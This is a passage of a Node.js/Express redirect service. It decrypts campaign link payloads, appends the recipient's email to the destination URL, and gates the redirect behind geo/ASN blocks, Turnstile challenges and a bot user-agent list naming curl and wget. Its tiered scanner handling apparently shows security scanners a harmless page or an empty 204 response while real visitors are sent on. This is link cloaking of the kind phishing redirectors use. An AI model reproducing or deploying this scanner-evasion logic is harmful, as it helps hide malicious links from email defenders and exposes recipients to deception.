    addDenyCache(ctx.denyCacheIp, `geo_block:${geoSourceTag}`);
    recordOffenderSignals(req, { country: ctry, asn });
    return { blocked: true, status: 403, message: "Forbidden" };
  }
  if (asnBlocked(asn)) {
    const shouldLog = aggregatePerIpEvent("ASN", { ip: ctx.ip, reason: "asn_block" });
    if (shouldLog) {
      addLog(`[ASN] blocked asn=${safeLogValue(asn)} ip=${safeLogValue(ctx.ip)}`);
      addSpacer();
    }
    addDenyCache(ctx.denyCacheIp, "asn_block");
    recordOffenderSignals(req, { country: ctry, asn });
    return { blocked: true, status: 403, message: "Forbidden" };
  }
  return null;
}

async function checkSecurityPolicies(req) {
  const ctx = createSecurityPolicyContext(req);
  const syncChecks = [
    checkDenyCachePolicy,
    checkCloudflareHeaderPolicy,
    checkIpBanPolicy,
    checkScannerPolicy,
    checkBadUaPolicy,
    checkHeadlessPolicy
  ];

  for (const check of syncChecks) {
    if (check === checkIpBanPolicy) logInterstitialBypassIfActive(ctx);
    const result = check(req, ctx);
    if (result) return result;
  }

  const geoAsnResult = await checkGeoAsnPolicy(req, ctx);
  return geoAsnResult || { blocked: false };
}
// Brownout runs after hard security checks so deny-cache, bans, scanner, geo,
// and ASN policy decisions still execute and get recorded during overload.
app.use(async (req, res, next) => {
  try {
    if (!isBrownoutActive()) return next();

    const p = getNormalizedRequestPathForPolicy(req);
    if (isOperationalBypassPath(p)) return next();

    const securityCheck = await checkSecurityPolicies(req);
    if (securityCheck.blocked) {
      if (securityCheck.interstitial) {
        const nextEnc = encodeURIComponent(String(req.originalUrl || req.url || p));
        const scannerReason = securityCheck.scannerReason || "Known scanner UA";
        logScannerHit(req, scannerReason, nextEnc);
        addLog(`[BROWNOUT] scanner interstitial suppressed ip=${safeLogValue(getClientIp(req), 64)} reason=${safeLogValue(scannerReason, 80)}`);
      } else {
        return res.status(securityCheck.status).send(securityCheck.message);
      }
    }

    const ip = getClientIp(req);
    addLog(`[BROWNOUT-REJECT] ip=${safeLogValue(ip, 64)} path=${safeLogValue(p, 120)}`);
    res.setHeader("Retry-After", "10");
    return res.status(503).end("Service temporarily unavailable");
  } catch (err) {
    return next(err);
  }
});

async function verifyTurnstileAndRateLimit(req, baseString) {
  const identity = getRequestIdentity(req);
  const ip = identity.ip;
  const ua = req.get("user-agent") || "";

  const token = req.query.cft || req.get("cf-turnstile-response") || "";
  const linkHash = req.query.lh ? String(req.query.lh) : hashFirstSeg(baseString);

  const v = await verifyTurnstileToken(token, ip, { action:"link_redirect", linkHash, maxAgeSec:MAX_TOKEN_AGE_SEC });
  if (!v.ok) {
    addLog(`[AUTH] token invalid (${v.reason}) ip=${safeLogValue(ip)} ua="${safeLogValue(ua.slice(0, UA_TRUNCATE_LENGTH))}" -> /challenge`);
    // Missing token is normal for first-time human visits; reserve bypass alerts
    // for malformed/invalid supplied tokens and tamper-like states.
    if (token || (v.reason && v.reason !== "missing")) {
      recordChallengeBypassAttempt(req, `auth_${v.reason || 'invalid'}`);
      maybeDenyForVisibleIpReputation(req, ip, "challenge_abuse", { detail: v.reason || "invalid" });
    }
    return {
      redirect: createChallengeRedirect(baseString, req, "auth_invalid", {
        host: (v.reason === "bad_hostname" && v.data && v.data.hostname) ? v.data.hostname : ""
      })
    };
  }

  const { limited, retryAfterMs } = await isRateLimited(identity.rateLimitKey || ip);
  if (limited) {
    if (retryAfterMs && Number.isFinite(retryAfterMs)) {
      return { blocked: true, status: 429, retryAfter: Math.ceil(retryAfterMs/1000), message: "Too many requests" };
    }
    addLog(`[RL] 429 ip=${ip}`);
    addSpacer();
    return { blocked: true, status: 429, message: "Too many requests" };
  }

  if (token) {
    const challengeReason = sanitizeChallengeReason(req.query.cr || "");
    const logCtx = {
      ip: safeLogValue(ip),
      uaHash: hashUaForToken(ua),
      linkHash: safeLogValue(linkHash, 64),
      reason: safeLogValue(challengeReason || "-", 48)
    };
    addLog(`[CHALLENGE-OK] ${safeLogJson(logCtx, LOG_ENTRY_MAX_LENGTH)}`);
  }

  return { success: true };
}

function parseRedirectPayloadForRequest(baseString) {
  return parseRedirectPayload(baseString, {
    decodeBase64UrlLoose: decodeB64urlLoose,
    decodeFallback: safeDecode,
    isValidEmail: isLikelyEmail
  });
}

function logRedirectPayloadParserContext(parsedPayload) {
  const parserLogCtx = {
    matchedNewFormat: !!parsedPayload.matchedNewFormat,
    parseMode: parsedPayload.parseMode || parsedPayload.mode,
    emailSegment: parsedPayload.emailSegment || "none",
    emailPresent: !!(parsedPayload.emailPart || parsedPayload.email),
    ambiguityDetected: !!parsedPayload.ambiguityDetected
  };
  addLog(`[PATH-NORMALIZE] ${safeLogJson(parserLogCtx, LOG_ENTRY_MAX_LENGTH)}`);
}

function buildRedirectDecryptCandidates(parsedPayload, baseString) {
  const hasCanonicalPayload = parsedPayload.canonicalBaseString && parsedPayload.canonicalBaseString !== baseString;
  const shouldPreferCanonical = hasCanonicalPayload && !!parsedPayload.emailPart;
  const canonicalCandidate = {
    mode: parsedPayload.mode || "canonical",
    value: parsedPayload.canonicalBaseString || baseString,
    mainPart: parsedPayload.ciphertext || parsedPayload.canonicalBaseString || baseString,
    emailPart: parsedPayload.emailPart || null
  };
  const legacyCandidate = { mode: "legacy", value: baseString, mainPart: baseString, emailPart: null };
  const candidates = shouldPreferCanonical ? [canonicalCandidate, legacyCandidate] : [canonicalCandidate];
  if (hasCanonicalPayload && !shouldPreferCanonical) candidates.push(legacyCandidate);
  return candidates;
}

function tryDecryptRedirectCandidate(candidate) {
  let result = null;
  result = tryDecryptAny(candidate.mainPart);
  let decryptedPayload = result && result.url;
  let emailPart = candidate.emailPart || null;

  if (!decryptedPayload) {
    const fallback = tryDecryptAtKnownDelimiterBoundaries(candidate.value);
    if (fallback && fallback.url) {
      decryptedPayload = fallback.url;
      if (!emailPart) emailPart = fallback.emailRaw || null;
      addLog(`[DECRYPT] fallback split used mode=${candidate.mode} k=${fallback.kTried} emailRawLen=${(fallback.emailRaw || '').length}`);
    }
  }

  return { decryptedPayload, emailPart, result };
}

function parseDecryptedRedirectPayload(decryptedPayload) {
  const parsedResult = {
    parsedUrl: decryptedPayload,
    pinnedHost: null,
    hmacChecked: false,
    hmacValid: false
  };

  try {
    const parsed = JSON.parse(decryptedPayload);
    if (parsed && typeof parsed === "object") {
      if (typeof parsed.url === "string") parsedResult.parsedUrl = parsed.url;
      if (typeof parsed.dest_host === "string") parsedResult.pinnedHost = parsed.dest_host;
      if (typeof parsed.hmac === "string" && parsedResult.pinnedHost && parsedResult.parsedUrl) {
        const res = verifyLinkHmac(parsedResult.parsedUrl, parsedResult.pinnedHost, parsed.hmac);
        parsedResult.hmacChecked = true;
        parsedResult.hmacValid = !!res.ok;
      }
    }
  } catch {}

  return parsedResult;
}

function logRedirectHmacMismatch(req, linkHash, pinnedHost) {
  const ua = req.get("user-agent") || "";
  const logCtx = {
    ip: safeLogValue(getClientIp(req)),
    uaHash: hashUaForToken(ua),
    linkHash: safeLogValue(linkHash, 64),
    destHost: safeLogValue(pinnedHost || "-", 120)
  };
  addLog(`[DECRYPT] hmac mismatch ${safeLogJson(logCtx, LOG_ENTRY_MAX_LENGTH)}`);
  addSpacer();
}

function decryptAndParseUrl(req, baseString) {
  const ip = getClientIp(req);
  const linkHash = req.query.lh ? String(req.query.lh) : hashFirstSeg(baseString);
  const parsedPayload = parseRedirectPayloadForRequest(baseString);
  logRedirectPayloadParserContext(parsedPayload);

  const sizeDecision = evaluateRedirectPayloadSize(parsedPayload, baseString);
  maybeLogRedirectPayloadSizeDecision(req, sizeDecision, "decrypt");
  if (!sizeDecision.ok) {
    addSpacer();
    return { error: "Failed to load" };
  }

  if (parsedPayload.rawUrl) {
    addLog(`[PATH-NORMALIZE] raw-url parser applied emailPresent=${parsedPayload.emailPart ? "true" : "false"}`);
    return { finalUrl: parsedPayload.rawUrl, emailPart: parsedPayload.emailPart || null, pinnedHost: null, linkHash };
  }

  const candidates = buildRedirectDecryptCandidates(parsedPayload, baseString);
  for (const [index, candidate] of candidates.entries()) {
    if (candidate.emailPart) {
      addLog(`[PARSE] canonical email mode=${candidate.mode} mainLen=${candidate.mainPart.length} emailRawLen=${candidate.emailPart.length}`);
    }

    let decryptResult;
    try {
      decryptResult = tryDecryptRedirectCandidate(candidate);
    } catch (e) {
      addLog(`[DECRYPT] exception ip=${safeLogValue(ip)} mode=${candidate.mode} seg="${safeLogValue(String(candidate.mainPart), EMAIL_DISPLAY_MAX_LENGTH)}" err=${safeLogValue(e.message)}`);
      addSpacer();
      return { error: "Failed to load" };
    }

    if (!decryptResult.decryptedPayload) {
      if (index < candidates.length - 1) {
        addLog(`[PATH-NORMALIZE] parse failed, trying next mode=${safeLogValue(candidates[index + 1]?.mode || "unknown", 64)}`);
        continue;
      }
      const why = explainDecryptFailure({
        tried: decryptResult.result?.tried || [],
        lastErr: decryptResult.result?.lastErr || null,
        segLen: candidate.mainPart.length
      });
      addLog(`[DECRYPT] failed variants ip=${safeLogValue(ip)} mode=${candidate.mode} seg="${safeLogValue(String(candidate.mainPart), EMAIL_DISPLAY_MAX_LENGTH)}" mainLen=${candidate.mainPart.length} why=${safeLogValue(why)}`);
      addSpacer();
      return { error: "Failed to load" };
    }

    const parsedDecrypted = parseDecryptedRedirectPayload(decryptResult.decryptedPayload);
    if (parsedDecrypted.hmacChecked && !parsedDecrypted.hmacValid) {
      logRedirectHmacMismatch(req, linkHash, parsedDecrypted.pinnedHost);
      return { error: "Failed to load" };
    }

    if (parsedPayload.matchedNewFormat) {
      addLog(`[PATH-NORMALIZE] canonical parser applied mode=${safeLogValue(parsedPayload.parseMode, 64)} emailSegment=${safeLogValue(parsedPayload.emailSegment || "none", 16)}`);
    }
    return { finalUrl: parsedDecrypted.parsedUrl, emailPart: decryptResult.emailPart, pinnedHost: parsedDecrypted.pinnedHost, linkHash };
  }

  if (parsedPayload.ambiguityDetected) {
    addLog(`[PATH-NORMALIZE] ambiguous email segments; falling back to legacy invalid handling`);
  }
  addSpacer();
  return { error: "Failed to load" };
}
function processEmailAndFinalizeUrl(finalUrl, emailPart) {
  if (emailPart) {
    const emailResult = decodeEmailPart(emailPart);

    if (emailResult.email) {
      finalUrl += '#' + emailResult.email;
      if (emailResult.source === 'recovered') {
        addLog(`[EMAIL] recovered from noisy decode ${safeLogValue(maskEmail(emailResult.email), EMAIL_DISPLAY_MAX_LENGTH)}`);
      } else {
        addLog(`[EMAIL] captured ${safeLogValue(maskEmail(emailResult.email), EMAIL_DISPLAY_MAX_LENGTH)}`);
      }
    } else if (emailResult.decoded) {
      addLog(`[EMAIL] ignored (not a valid email): "${safeLogValue(emailResult.decoded, EMAIL_DISPLAY_MAX_LENGTH)}" (raw="${safeLogValue(String(emailPart).slice(0,40))}…")`);
    } else {
      addLog(`[EMAIL] ignored (decode empty) raw="${safeLogValue(String(emailPart).slice(0,40))}…"`);
    }
  }

  return finalUrl;
}

function renderInvalidLinkPage(res) {
  const html = `<!doctype html><html><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="robots" content="noindex,nofollow">
<title>Link unavailable</title>
<style>
  body{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;font:16px/1.5 system-ui,-apple-system,Segoe UI,Roboto,Inter,Arial,sans-serif;background:#0c1116;color:#e8eef6;padding:24px;}
  .card{max-width:520px;width:100%;background:#0f172a;border:1px solid rgba(255,255,255,0.08);border-radius:14px;padding:24px;box-shadow:0 24px 60px rgba(0,0,0,0.45);}
  h1{margin:0 0 8px;font-size:24px;}
  p{margin:0 0 8px;color:#cbd5e1;}
</style>
</head>
<body>
  <div class="card">
    <h1>Link invalid or expired</h1>
    <p>The link you followed is no longer valid. Please contact the sender for a fresh link.</p>
    <p>If you believe this is an error, try opening the link from the original message again.</p>
  </div>
</body>
</html>`;
  res.setHeader("Cache-Control", "no-store");
  return res.status(400).type("html").send(html);
}

function logHostPinFailure({ ip, ua, linkHash, pinnedHost, actualHost }) {
  const logCtx = {
    ip: safeLogValue(ip),
    uaHash: hashUaForToken(ua || ""),
    linkHash: safeLogValue(linkHash || "-", 64),
    pinnedHost: safeLogValue(pinnedHost || "-", 160),
    actualHost: safeLogValue(actualHost || "-", 160)
  };
  addLog(`[PIN] host mismatch ${safeLogJson(logCtx, LOG_ENTRY_MAX_LENGTH)}`);
  addSpacer();
}

function validateAndRedirect(finalUrl, req, res, options = {}) {
  const ip = getClientIp(req);
  const ua = req.get("user-agent") || "";
  const pinnedHost = options.pinnedHost || null;
  const linkHash = options.linkHash || null;

  try {
    const parsedUrl = new URL(finalUrl);
    const hostname = normHost(parsedUrl.hostname);
    const protocol = parsedUrl.protocol;
    const normalizedPinnedHost = options.pinnedHost ? normHost(options.pinnedHost) : null;

    if (!["http:", "https:"].includes(protocol)) {
      addLog(`[ALLOWLIST] blocked protocol=${safeLogValue(protocol)} host=${safeLogValue(hostname)} ip=${safeLogValue(ip)}`);
      addSpacer();
      return res.status(403).send("Unauthorized URL");
    }

    if (normalizedPinnedHost && normalizedPinnedHost !== hostname) {
      logHostPinFailure({ ip, ua, linkHash, pinnedHost: normalizedPinnedHost, actualHost: hostname });
      return renderInvalidLinkPage(res);
    }

    const okHost = isHostAllowlisted(hostname);

    if (!okHost) {
      addLog(`[ALLOWLIST] blocked host=${hostname} ip=${ip}`);
      addSpacer();
      return res.status(403).send("Unauthorized URL");
    }

    addLog(`[REDIRECT] ip=${safeLogValue(ip)} -> ${safeLogValue(finalUrl, URL_DISPLAY_MAX_LENGTH)}`);
    addSpacer();
    return res.redirect(302, finalUrl);
  } catch (e) {
    addLog(`[URL] invalid ip=${safeLogValue(ip)} value="${safeLogValue((finalUrl || ""), URL_DISPLAY_MAX_LENGTH)}" err="${safeLogValue(e.message)}"`);
    addSpacer();
    return res.status(400).send("Invalid URL");
  }
}

async function handleRedirectCore(req, res, baseString){
  try {
    const clientIp = getClientIp(req);
    const ua = req.get("user-agent") || "";
    const linkHash = req.query.lh ? String(req.query.lh) : hashFirstSeg(baseString);
    const bypassInterstitial = hasInterstitialBypass(req);

    // HEAD /r?d=... is dispatched by Express through the GET route and does not
    // pass through the deep-link HEAD middleware, so establish scanner state
    // here as well. Explicitly bypassed automation must retain normal routing.
    if (req.method === "HEAD" && !bypassInterstitial) {
      logScannerHit(req, "HEAD-probe", baseString);
      return sendScannerSafetyLaneHeadResponse(req, res, baseString, "HEAD-probe", {
        source: "redirect-route"
      });
    }

    if (!bypassInterstitial && isRecentHeaderlessScannerGet(req)) {
      return sendHeaderlessScannerFollowupResponse(req, res, baseString, "catchall");
    }

    const hasSecUA = !!req.get("sec-ch-ua");
    const hasFetchSite = !!req.get("sec-fetch-site");
    const missingSecHeaders = !hasSecUA || !hasFetchSite;
    const knownBots = ["Googlebot","Bingbot","Slurp","DuckDuckBot","Baiduspider","YandexBot","Sogou","Exabot","facebot","facebookexternalhit","ia_archiver","MJ12bot","AhrefsBot","SemrushBot","DotBot","PetalBot","GPTBot","python-requests","crawler","scrapy","curl","wget","phantomjs","HeadlessChrome"];
    const isBotUA = knownBots.some(b => ua.toLowerCase().includes(b.toLowerCase()));
    const hasTurnstileToken = !!req.query.cft;

    const securityCheck = await checkSecurityPolicies(req);
    if (securityCheck.blocked) {
      if (securityCheck.interstitial) {
        // --- NEW: Tiered scanner handling inside handleRedirectCore ---
        const topDetection = securityCheck.scanner ? { name: securityCheck.scanner, confidence: securityCheck.scannerConfidence || 0.9 } : null;
        const confidence = topDetection ? (topDetection.confidence || 0) : 0;
        const scannerResult = topDetection ? { detections: [topDetection], isScanner: true } : null;

        // If scanner safe HTML is enabled and this scanner decision met the threshold,
        // internally move the normal campaign URL into the scanner safety lane.
        if (scannerResult) {
          const handledBySafetyLane = await tryRenderTrustedScannerSafeHtmlForPayload(req, res, baseString, securityCheck, {
            source: "catchall",
            clientIp,
            ua,
            linkHash
          });
          if (handledBySafetyLane) return;
        }

        // Medium confidence: return 204 with headers only
        if (confidence >= 0.80) {
          if (securityCheck.scannerProfile) {
            applyScannerCompatHeaders(res);
            applyScannerProfileHeaders(res, securityCheck.scannerProfile);
          }
          res.status(204).end();
          return;
        }

        // Low confidence: fallback to the standard interstitial
        const nextEnc = encodeURIComponent(baseString);
        const scannerReason = securityCheck.scannerReason || "Known scanner UA";
        logScannerHit(req, scannerReason, nextEnc);
        return renderScannerSafePage(req, res, nextEnc, scannerReason, {
          scannerProfile: securityCheck.scannerProfile
        });
      }
      return res.status(securityCheck.status).send(securityCheck.message);
    }

    const authCheck = await verifyTurnstileAndRateLimit(req, baseString);
    if (authCheck.redirect) {
      return res.redirect(302, authCheck.redirect);
    }
    if (authCheck.blocked) {
      if (authCheck.retryAfter) {
        res.setHeader("Retry-After", authCheck.retryAfter);
      }
      return res.status(authCheck.status).send(authCheck.message);
    }

    if (isBotUA || missingSecHeaders) {
      const reason = isBotUA ? "bot_heuristic" : "missing_sec_headers";
      const logCtx = {
        ip: safeLogValue(clientIp),
        uaHash: hashUaForToken(ua),
        linkHash: safeLogValue(linkHash, 64),
        isBotUA,
        missingSecHeaders,
        hasSecUA: !!hasSecUA,
        hasFetchSite: !!hasFetchSite
      };
      addLog(`[CHALLENGE-TRIGGER] ${safeLogJson(logCtx, LOG_ENTRY_MAX_LENGTH)}`);
      addSpacer();

      if (!hasTurnstileToken) {
        const reasonParam = sanitizeChallengeReason(reason);
        return res.redirect(302, createChallengeRedirect(baseString, req, reasonParam));
      }
    }

    const decryptResult = decryptAndParseUrl(req, baseString);
    if (decryptResult.error) {
      return res.status(400).send(decryptResult.error);
    }

    const finalUrl = processEmailAndFinalizeUrl(decryptResult.finalUrl, decryptResult.emailPart);
    return validateAndRedirect(finalUrl, req, res, { pinnedHost: decryptResult.pinnedHost, linkHash: decryptResult.linkHash });
  } catch (e) {
    addLog(`[REDIRECT-ERROR] ip=${safeLogValue(getClientIp(req))} path=${safeLogValue(req.originalUrl || '', PATH_TRUNCATE_LENGTH)} err=${safeLogValue(e?.message || 'unknown')}`);
    addSpacer();
    return res.status(500).send("Temporary error");
  }
}


  return {
    INTERSTITIAL_REASON_HEADER_ENABLED,
    toReasonCode,
    applyMemoryPressureRelief,
    shouldApplyMemoryPressureRelief,
    markInterstitialHuman,
    INTERSTITIAL_BYPASS_SECRET,
    hasInterstitialBypass,
    renderScannerSafePage,
    sendScannerSafetyLaneHeadResponse,
    tryRenderTrustedScannerSafeHtmlForPayload,
    handleRedirectCore
  };
}

module.exports = createRedirectCore;
